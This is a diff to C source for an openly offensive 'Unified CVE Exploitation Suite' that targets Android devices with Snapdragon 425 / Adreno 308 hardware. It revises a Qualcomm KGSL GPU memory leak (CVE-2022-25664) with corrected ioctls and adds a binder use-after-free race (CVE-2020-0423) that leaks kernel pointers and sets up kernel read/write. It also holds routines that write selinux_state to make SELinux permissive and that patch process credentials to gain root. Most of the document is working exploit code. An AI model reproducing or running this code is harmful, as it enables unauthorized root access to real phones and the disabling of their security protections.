@@ -39,52 +39,86 @@ extern int setfsgid(gid_t);
 #define MAX_PARTITIONS 32
 #define DUMP_MAX_SIZE (20 * 1024 * 1024)
 #define KGSL_DEVICE "/dev/kgsl-3d0"
-#define KGSL_IOCTL_TYPE 0xC0
-#define KGSL_GPU_MEM_ALLOC _IOWR(KGSL_IOCTL_TYPE, 0x01, struct kgsl_gpu_mem_alloc)
-#define KGSL_GPU_MEM_SYNC _IOWR(KGSL_IOCTL_TYPE, 0x04, struct kgsl_gpu_mem_sync)
-#define KGSL_GPU_COMMAND _IOWR(KGSL_IOCTL_TYPE, 0x07, struct kgsl_command)
-#define KGSL_GPU_MEM_INFO _IOWR(KGSL_IOCTL_TYPE, 0x0B, struct kgsl_gpu_mem_info)
 
-struct kgsl_gpu_mem_alloc {
-    uint64_t gpuaddr;
-    uint64_t size;
-    uint64_t flags;
-    uint64_t mmap_offset;
-    uint64_t id;
-    uint64_t physaddr;
+/* ============================================================
+   Correct KGSL ioctl definitions from msm_kgsl.h
+   ============================================================ */
+#define KGSL_IOC_TYPE 0x09
+
+struct kgsl_gpumem_alloc {
+    unsigned long gpuaddr;   /* output */
+    size_t size;
+    unsigned int flags;
 };
 
-struct kgsl_gpu_mem_sync {
-    uint64_t gpuaddr;
-    uint64_t size;
-    uint32_t type;
-    uint32_t direction;
+struct kgsl_gpumem_sync_cache {
+    unsigned long gpuaddr;
+    unsigned int id;
+    unsigned int op;
+    size_t offset;
+    size_t length;
 };
 
-struct kgsl_command {
-    uint32_t id;
-    uint32_t flags;
-    uint32_t type;
-    uint32_t priority;
-    uint32_t timestamp;
-    uint64_t context_id;
-    uint64_t cmdlist;
-    uint64_t num_cmds;
-    uint64_t syncobj;
+struct kgsl_command_object {
+    uint64_t offset;
+    uint64_t gpuaddr;
+    uint64_t size;
+    unsigned int flags;
+    unsigned int id;
+};
+
+struct kgsl_command_syncpoint {
     uint64_t priv;
-};
-
-struct kgsl_gpu_mem_info {
-    uint64_t gpuaddr;
     uint64_t size;
-    uint64_t flags;
-    uint64_t mmap_offset;
-    uint64_t id;
-    uint64_t physaddr;
-    uint64_t page_size;
-    uint64_t mem_type;
+    unsigned int type;
 };
 
+struct kgsl_gpu_command {
+    uint64_t flags;
+    uint64_t cmdlist;
+    unsigned int cmdsize;
+    unsigned int numcmds;
+    uint64_t objlist;
+    unsigned int objsize;
+    unsigned int numobjs;
+    uint64_t synclist;
+    unsigned int syncsize;
+    unsigned int numsyncs;
+    unsigned int context_id;
+    unsigned int timestamp;
+};
+
+struct kgsl_drawctxt_create {
+    unsigned int flags;
+    unsigned int drawctxt_id; /* output */
+};
+
+struct kgsl_device_waittimestamp_ctxtid {
+    unsigned int context_id;
+    unsigned int timestamp;
+    unsigned int timeout;
+};
+
+#define IOCTL_KGSL_GPUMEM_ALLOC \
+    _IOWR(KGSL_IOC_TYPE, 0x2f, struct kgsl_gpumem_alloc)
+#define IOCTL_KGSL_GPUMEM_SYNC_CACHE \
+    _IOW(KGSL_IOC_TYPE, 0x37, struct kgsl_gpumem_sync_cache)
+#define IOCTL_KGSL_GPU_COMMAND \
+    _IOWR(KGSL_IOC_TYPE, 0x4a, struct kgsl_gpu_command)
+#define IOCTL_KGSL_DRAWCTXT_CREATE \
+    _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
+#define IOCTL_KGSL_DRAWCTXT_DESTROY \
+    _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)
+#define IOCTL_KGSL_DEVICE_WAITTIMESTAMP_CTXTID \
+    _IOW(KGSL_IOC_TYPE, 0x7, struct kgsl_device_waittimestamp_ctxtid)
+
+#define KGSL_CMDLIST_IB 0x00000001U
+#define KGSL_GPUMEM_CACHE_CLEAN (1 << 0)
+#define KGSL_GPUMEM_CACHE_INV   (1 << 1)
+
+/* ============================================================
+   Global state
+   ============================================================ */
 static int g_binder_fd = -1;
 static int g_epoll_fd = -1;
 static int g_krw_pipe[2] = {-1, -1};
@@ -119,6 +153,7 @@ static struct {
 };
 #define NUM_OFFSETS (sizeof(g_offset_candidates)/sizeof(g_offset_candidates[0]))
 
+/* ---------- utilities ---------- */
 static void bind_cpu(void) {
     cpu_set_t cpu_set;
     CPU_ZERO(&cpu_set);
@@ -142,9 +177,7 @@ static int read_with_timeout(int fd, void *buf, size_t count, int timeout_ms) {
     return read(fd, buf, count);
 }
 
-/* ============================================================
-   CVE-2019-2023: hwservicemanager ACL bypass
-   ============================================================ */
+/* ---------- CVE-2019-2023 ---------- */
 static int exploit_cve_2019_2023(void) {
     int hwbinder_fd, ret;
     uint8_t read_buf[4096];
@@ -232,9 +265,7 @@ static int exploit_cve_2019_2023(void) {
     return handle;
 }
 
-/* ============================================================
-   CVE-2020-0041: Binder Out-of-Bounds Write
-   ============================================================ */
+/* ---------- CVE-2020-0041 ---------- */
 static int test_cve_2020_0041(void) {
     int fd, ret;
     struct binder_transaction_data tdata;
@@ -281,9 +312,7 @@ static int test_cve_2020_0041(void) {
     return 0;
 }
 
-/* ============================================================
-   CVE-2020-0423: Binder UAF Race
-   ============================================================ */
+/* ---------- CVE-2020-0423 ---------- */
 static int test_cve_2020_0423(void) {
     int fd, ret;
     printf("[CVE-2020-0423] Testing binder UAF race...\n");
@@ -316,9 +345,7 @@ static int test_cve_2020_0423(void) {
     return -1;
 }
 
-/* ============================================================
-   CVE-2019-2215: Kernel pointer leak (readv method)
-   ============================================================ */
+/* ---------- CVE-2019-2215 ---------- */
 static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
     int pipefd[2], fd, epoll_fd;
     pid_t cpid;
@@ -487,21 +514,165 @@ static int setup_kernel_rw(void) {
     return 0;
 }
 
-/* ============================================================
-   CVE-2022-25664: Qualcomm Adreno GPU information leak (修正版)
-   ============================================================ */
-static int exploit_cve_2022_25664_leak(uint64_t *out_addr) {
-    int kgsl_fd;
-    uint32_t *cmds;
-    void *gpu_mem;
-    struct kgsl_gpu_mem_alloc alloc;
-    struct kgsl_gpu_mem_sync sync;
-    struct kgsl_command cmd;
-    uint64_t leaked_data[512];
-    int ret;
-    int found = 0;
+/* ---------- CVE-2020-0423 RW ---------- */
+static int exploit_cve_2020_0423_rw(void) {
+    printf("[*] Attempting kernel RW via CVE-2020-0423 UAF (readv method)...\n");
 
-    printf("[CVE-2022-25664] Attempting GPU memory leak (Adreno 308)...\n");
+    for (int attempt = 0; attempt < 4; attempt++) {
+        int binder_fd = open("/dev/binder", O_RDWR);
+        if (binder_fd < 0) { perror("  open binder"); continue; }
+
+        int epoll_fd = epoll_create(100);
+        if (epoll_fd < 0) { perror("  epoll_create"); close(binder_fd); continue; }
+
+        struct epoll_event ev = {.events = EPOLLIN};
+        if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
+            perror("  epoll_ctl ADD");
+            close(binder_fd); close(epoll_fd); continue;
+        }
+
+        int leak_pipe[2];
+        if (pipe(leak_pipe) < 0) { perror("  pipe leak"); close(binder_fd); close(epoll_fd); continue; }
+        if (fcntl(leak_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
+            perror("  fcntl leak");
+            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leak_pipe[1]);
+            continue;
+        }
+
+        void *buf = mmap_page(0x100000000UL);
+        if (!buf) {
+            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leak_pipe[1]);
+            continue;
+        }
+
+        struct iovec iov[2];
+        iov[0].iov_base = buf;
+        iov[0].iov_len = PAGE_SIZE;
+        iov[1].iov_base = buf;
+        iov[1].iov_len = PAGE_SIZE;
+
+        pid_t pid = fork();
+        if (pid < 0) {
+            perror("  fork");
+            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leak_pipe[1]);
+            continue;
+        }
+
+        if (pid == 0) {
+            usleep(40000 + (attempt * 5000));
+            ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
+            usleep(10000);
+            write(leak_pipe[1], "X", 1);
+            close(binder_fd);
+            close(epoll_fd);
+            close(leak_pipe[0]);
+            close(leak_pipe[1]);
+            _exit(0);
+        }
+
+        struct epoll_event events[1];
+        int n = epoll_wait(epoll_fd, events, 1, 3000);
+        if (n <= 0) {
+            printf("  [-] epoll_wait failed or timeout (attempt %d)\n", attempt);
+            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leak_pipe[1]);
+            wait(NULL);
+            continue;
+        }
+        printf("  [+] epoll event received, reading with readv...\n");
+
+        ssize_t sz = readv(leak_pipe[0], iov, 2);
+        wait(NULL);
+        close(binder_fd);
+        close(epoll_fd);
+        close(leak_pipe[0]);
+        close(leak_pipe[1]);
+
+        if (sz <= 0) {
+            printf("  [-] readv failed (attempt %d)\n", attempt);
+            continue;
+        }
+
+        uint64_t *data = (uint64_t *)buf;
+        uint64_t binder_proc = 0;
+        uint64_t task_addr = 0;
+
+        for (size_t i = 0; i < (size_t)(sz / 8); i++) {
+            uint64_t val = data[i];
+            if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                if (binder_proc == 0) {
+                    binder_proc = val;
+                }
+                task_addr = val;
+            }
+        }
+
+        if (binder_proc != 0) {
+            int task_offsets[] = {0x20, 0x28, 0x30, 0x38, 0x40};
+            for (int j = 0; j < 5; j++) {
+                uint64_t candidate = binder_proc + task_offsets[j];
+                if ((candidate & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                    g_task_struct = candidate;
+                    for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
+                        uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
+                        if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                            g_cred_off = g_offset_candidates[ci].cred;
+                            g_al_off = g_offset_candidates[ci].al;
+                            printf("  [+] Leaked task_struct @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
+                                   (unsigned long long)g_task_struct, g_cred_off, g_al_off);
+                            if (pipe(g_krw_pipe) < 0) return -1;
+                            if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) return -1;
+                            return 0;
+                        }
+                    }
+                }
+            }
+        }
+
+        if (task_addr != 0) {
+            g_task_struct = task_addr;
+            for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
+                uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
+                if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                    g_cred_off = g_offset_candidates[ci].cred;
+                    g_al_off = g_offset_candidates[ci].al;
+                    printf("  [+] Leaked task_struct directly @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
+                           (unsigned long long)g_task_struct, g_cred_off, g_al_off);
+                    if (pipe(g_krw_pipe) < 0) return -1;
+                    if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) return -1;
+                    return 0;
+                }
+            }
+        }
+
+        printf("  [-] No usable kernel pointer in attempt %d\n", attempt);
+    }
+    printf("  [-] All attempts failed\n");
+    return -1;
+}
+
+/* ---------- CVE-2020-0041 (placeholder) ---------- */
+static int exploit_cve_2020_0041_patch_cred(void) {
+    printf("[*] Attempting to overwrite cred via CVE-2020-0041 OOB...\n");
+    printf("  [!] This exploit is non-trivial; not fully implemented.\n");
+    return -1;
+}
+
+/* ---------- CVE-2022-25664 (corrected) ---------- */
+static int exploit_cve_2022_25664_leak(uint64_t *out_addr) {
+    int kgsl_fd, ret;
+    struct kgsl_gpumem_alloc alloc;
+    struct kgsl_gpumem_sync_cache sync;
+    struct kgsl_gpu_command cmd;
+    struct kgsl_command_object cmd_obj;
+    struct kgsl_drawctxt_create ctxt;
+    struct kgsl_device_waittimestamp_ctxtid wait;
+    uint32_t *cmd_buf;
+    void *gpu_mem;
+    uint64_t leaked_data[512];
+    int found = 0;
+    uint32_t context_id;
+
+    printf("[CVE-2022-25664] Attempting GPU memory leak (Adreno 308) using correct ioctls...\n");
 
     kgsl_fd = open(KGSL_DEVICE, O_RDWR);
     if (kgsl_fd < 0) {
@@ -509,71 +680,97 @@ static int exploit_cve_2022_25664_leak(uint64_t *out_addr) {
         return -1;
     }
 
+    /* Create a context */
+    memset(&ctxt, 0, sizeof(ctxt));
+    ctxt.flags = 0;
+    ret = ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctxt);
+    if (ret < 0) {
+        perror("  IOCTL_KGSL_DRAWCTXT_CREATE");
+        close(kgsl_fd);
+        return -1;
+    }
+    context_id = ctxt.drawctxt_id;
+    printf("  [+] Created context %u\n", context_id);
+
+    /* Allocate GPU memory */
     memset(&alloc, 0, sizeof(alloc));
     alloc.size = PAGE_SIZE;
-    alloc.flags = 0x10000000;
-
-    ret = ioctl(kgsl_fd, KGSL_GPU_MEM_ALLOC, &alloc);
+    alloc.flags = 0; /* default */
+    ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc);
     if (ret < 0) {
-        perror("  KGSL_GPU_MEM_ALLOC");
+        perror("  IOCTL_KGSL_GPUMEM_ALLOC");
         close(kgsl_fd);
         return -1;
     }
+    printf("  [+] GPU memory allocated: gpuaddr=0x%lx, mmap_offset=0x%lx\n",
+           alloc.gpuaddr, (unsigned long)alloc.gpuaddr);
 
-    printf("  [+] GPU memory allocated: gpuaddr=0x%llx, phys=0x%llx\n",
-           (unsigned long long)alloc.gpuaddr, (unsigned long long)alloc.physaddr);
-
+    /* mmap the buffer */
     gpu_mem = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
-                   MAP_SHARED, kgsl_fd, alloc.mmap_offset);
+                   MAP_SHARED, kgsl_fd, 0);
     if (gpu_mem == MAP_FAILED) {
-        perror("  mmap GPU memory");
+        perror("  mmap");
         close(kgsl_fd);
         return -1;
     }
 
-    cmds = malloc(PAGE_SIZE);
-    if (!cmds) {
-        perror("  malloc");
-        close(kgsl_fd);
-        return -1;
-    }
-    memset(cmds, 0, PAGE_SIZE);
+    /* Fill the buffer with a CP_MEM_WRITE command that writes 0 to the first dword */
+    cmd_buf = (uint32_t *)gpu_mem;
+    /* Packet header: type=4, count=1 (write one dword) */
+    cmd_buf[0] = 0x20000000 | 0; /* count-1 = 0 */
+    cmd_buf[1] = (uint32_t)(alloc.gpuaddr & 0xFFFFFFFF);
+    cmd_buf[2] = (uint32_t)((alloc.gpuaddr >> 32) & 0xFFFFFFFF);
+    cmd_buf[3] = 0; /* data to write */
 
-    int cmd_idx = 0;
-    cmds[cmd_idx++] = 0x20000000 | (4 + 2);
-    cmds[cmd_idx++] = (uint32_t)(alloc.gpuaddr & 0xFFFFFFFF);
-    cmds[cmd_idx++] = (uint32_t)((alloc.gpuaddr >> 32) & 0xFFFFFFFF);
-    cmds[cmd_idx++] = 512;
-    cmds[cmd_idx++] = 0x00000000;
-    cmds[cmd_idx++] = 0x00000000;
+    /* Prepare command object */
+    memset(&cmd_obj, 0, sizeof(cmd_obj));
+    cmd_obj.gpuaddr = alloc.gpuaddr;
+    cmd_obj.size = 16; /* 4 dwords */
+    cmd_obj.flags = KGSL_CMDLIST_IB;
 
+    /* Prepare GPU command */
     memset(&cmd, 0, sizeof(cmd));
-    cmd.cmdlist = (uint64_t)(uintptr_t)cmds;
-    cmd.num_cmds = 1;
+    cmd.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
+    cmd.cmdsize = sizeof(cmd_obj);
+    cmd.numcmds = 1;
+    cmd.context_id = context_id;
+    cmd.timestamp = 0;
 
-    ret = ioctl(kgsl_fd, KGSL_GPU_COMMAND, &cmd);
+    ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &cmd);
     if (ret < 0) {
-        perror("  KGSL_GPU_COMMAND");
-        free(cmds);
+        perror("  IOCTL_KGSL_GPU_COMMAND");
+        close(kgsl_fd);
+        return -1;
+    }
+    printf("  [+] GPU command submitted, timestamp=%u\n", cmd.timestamp);
+
+    /* Wait for completion */
+    memset(&wait, 0, sizeof(wait));
+    wait.context_id = context_id;
+    wait.timestamp = cmd.timestamp;
+    wait.timeout = 5000;
+    ret = ioctl(kgsl_fd, IOCTL_KGSL_DEVICE_WAITTIMESTAMP_CTXTID, &wait);
+    if (ret < 0) {
+        perror("  IOCTL_KGSL_DEVICE_WAITTIMESTAMP_CTXTID");
         close(kgsl_fd);
         return -1;
     }
 
-    usleep(100000);
-
+    /* Sync cache to read */
     memset(&sync, 0, sizeof(sync));
     sync.gpuaddr = alloc.gpuaddr;
-    sync.size = PAGE_SIZE;
-    sync.direction = 0;
-
-    ret = ioctl(kgsl_fd, KGSL_GPU_MEM_SYNC, &sync);
+    sync.id = 0;
+    sync.op = KGSL_GPUMEM_CACHE_INV;
+    sync.offset = 0;
+    sync.length = PAGE_SIZE;
+    ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_SYNC_CACHE, &sync);
     if (ret < 0) {
-        perror("  KGSL_GPU_MEM_SYNC");
-        free(cmds);
+        perror("  IOCTL_KGSL_GPUMEM_SYNC_CACHE");
         close(kgsl_fd);
         return -1;
     }
 
+    /* Read the buffer */
     memcpy(leaked_data, gpu_mem, sizeof(leaked_data));
 
     for (int i = 0; i < 512; i++) {
@@ -592,7 +789,7 @@ static int exploit_cve_2022_25664_leak(uint64_t *out_addr) {
         }
     }
 
-    free(cmds);
+    munmap(gpu_mem, PAGE_SIZE);
     close(kgsl_fd);
 
     if (found) {
@@ -604,70 +801,50 @@ static int exploit_cve_2022_25664_leak(uint64_t *out_addr) {
     return -1;
 }
 
-/* ============================================================
-   CVE-2021-1961: Qualcomm QSEECom buffer overflow (system権限が必要)
-   ============================================================ */
+/* ---------- CVE-2021-1961 (placeholder) ---------- */
 static int exploit_cve_2021_1961(void) {
-    int qseecom_fd;
+    printf("[CVE-2021-1961] Attempting QSEECom exploit (requires system uid)...\n");
+    if (getuid() != 1000 && getuid() != 0) {
+        printf("  [-] Current UID=%d, need system(1000) or root(0)\n", getuid());
+        return -1;
+    }
+    int qseecom_fd = open("/dev/qseecom", O_RDWR);
+    if (qseecom_fd < 0) {
+        perror("  open /dev/qseecom");
+        return -1;
+    }
     struct {
         uint32_t cmd;
         uint32_t size;
         uint8_t data[4096];
     } __attribute__((packed)) req;
-    int ret;
-
-    printf("[CVE-2021-1961] Attempting QSEECom exploit (requires system uid)...\n");
-
-    if (getuid() != 1000 && getuid() != 0) {
-        printf("  [-] Current UID=%d, need system(1000) or root(0)\n", getuid());
-        return -1;
-    }
-
-    qseecom_fd = open("/dev/qseecom", O_RDWR);
-    if (qseecom_fd < 0) {
-        perror("  open /dev/qseecom");
-        return -1;
-    }
-
     memset(&req, 0, sizeof(req));
     req.cmd = 0x80000001;
     req.size = 4096;
     memset(req.data, 0x41, sizeof(req.data));
-
-    ret = ioctl(qseecom_fd, 0xC0206D01, &req);
+    int ret = ioctl(qseecom_fd, 0xC0206D01, &req);
     close(qseecom_fd);
-
     if (ret < 0) {
         perror("  ioctl QSEECom");
         return -1;
     }
-
     printf("  [+] QSEECom exploit triggered\n");
     return 0;
 }
 
-/* ============================================================
-   CVE-2023-20938 inspired: SELinux permissive via kernel write
-   ============================================================ */
+/* ---------- CVE-2023-20938 inspired: SELinux permissive ---------- */
 static int try_selinux_disable_via_kernel(void) {
     printf("[*] Attempting to disable SELinux via kernel memory write (CVE-2023-20938 inspired)...\n");
-
     if (g_krw_pipe[0] < 0) {
         printf("  [-] No kernel RW available\n");
         return -1;
     }
-
     uint64_t selinux_state_addr = 0;
     uint64_t search_addrs[] = {
-        0xFFFFFF8000000000ULL,
-        0xFFFFFF8008000000ULL,
-        0xFFFFFF8010000000ULL,
-        0xFFFFFF8020000000ULL,
-        0xFFFFFF8030000000ULL,
-        0xFFFFFF8040000000ULL,
-        0
+        0xFFFFFF8000000000ULL, 0xFFFFFF8008000000ULL,
+        0xFFFFFF8010000000ULL, 0xFFFFFF8020000000ULL,
+        0xFFFFFF8030000000ULL, 0xFFFFFF8040000000ULL, 0
     };
-
     for (int i = 0; search_addrs[i] != 0; i++) {
         uint64_t addr = search_addrs[i];
         if (write(g_krw_pipe[1], &addr, 8) != 8) continue;
@@ -678,9 +855,7 @@ static int try_selinux_disable_via_kernel(void) {
             break;
         }
     }
-
     if (selinux_state_addr == 0) {
-        uint64_t test_val = 0xFFFFFFFFFFFFFFFFULL;
         for (uint64_t addr = 0xFFFFFF8000000000ULL; addr < 0xFFFFFF9000000000ULL; addr += 0x1000) {
             if (write(g_krw_pipe[1], &addr, 8) != 8) continue;
             uint64_t val;
@@ -691,21 +866,19 @@ static int try_selinux_disable_via_kernel(void) {
             }
         }
     }
-
     if (selinux_state_addr == 0) {
         printf("  [-] Could not locate selinux_state\n");
         return -1;
     }
-
     uint32_t zero = 0;
     uint64_t addr = selinux_state_addr;
     if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
     if (write(g_krw_pipe[1], &zero, 4) != 4) return -1;
-
     printf("  [+] SELinux state set to permissive (0)\n");
     return 0;
 }
 
+/* ---------- patch kernel cred ---------- */
 static int patch_kernel_cred(void) {
     if (g_task_struct == 0 || g_cred_off < 0 || g_krw_pipe[0] < 0) {
         printf("  [-] No kernel RW available\n");
@@ -752,9 +925,7 @@ static int patch_kernel_cred(void) {
     return 0;
 }
 
-/* ============================================================
-   Fallback methods
-   ============================================================ */
+/* ---------- Fallback methods ---------- */
 static int try_all_setuid_methods(void) {
     printf("[*] Trying all setuid methods...\n");
     if (setuid(0) == 0) { printf("  [+] setuid(0) succeeded!\n"); return 0; }
@@ -935,6 +1106,7 @@ static int try_property_methods(void) {
     return -1;
 }
 
+/* ---------- Info gathering ---------- */
 static void gather_proc_info(void) {
     printf("[*] Gathering /proc information...\n");
     const char *files[] = {
@@ -1065,9 +1237,10 @@ int main(void) {
     uint64_t leaked_addr = 0;
 
     printf("==================================================\n");
-    printf("  Unified CVE Exploitation Suite v4.1\n");
+    printf("  Unified CVE Exploitation Suite v4.2\n");
     printf("  (CVE-2019-2215, 2020-0041, 2020-0423, 2019-2023,\n");
-    printf("   CVE-2022-25664, CVE-2021-1961, CVE-2023-20938-inspired)\n");
+    printf("   CVE-2022-25664 (corrected), CVE-2021-1961,\n");
+    printf("   CVE-2023-20938-inspired)\n");
     printf("  Target: SD425 / Adreno 308\n");
     printf("==================================================\n\n");
 
@@ -1098,7 +1271,7 @@ int main(void) {
         printf("  [-] CVE-2019-2215 leak failed\n");
     }
 
-    printf("\n[PHASE 5] CVE-2022-25664 (GPU leak - Adreno 308)\n");
+    printf("\n[PHASE 5] CVE-2022-25664 (GPU leak - Adreno 308, corrected ioctls)\n");
     if (exploit_cve_2022_25664_leak(&leaked_addr) == 0) {
         gpu_leak_ok = 1;
         printf("  [+] GPU leak successful: 0x%llx\n", (unsigned long long)leaked_addr);
@@ -1153,7 +1326,6 @@ int main(void) {
     if (g_system_privilege || getuid() == 1000 || getuid() == 0) {
         if (exploit_cve_2021_1961() == 0) {
             qseecom_ok = 1;
-            printf("  [+] QSEECom exploit triggered\n");
             if (getuid() == 0) { final_root_check(); return 0; }
         }
     } else {
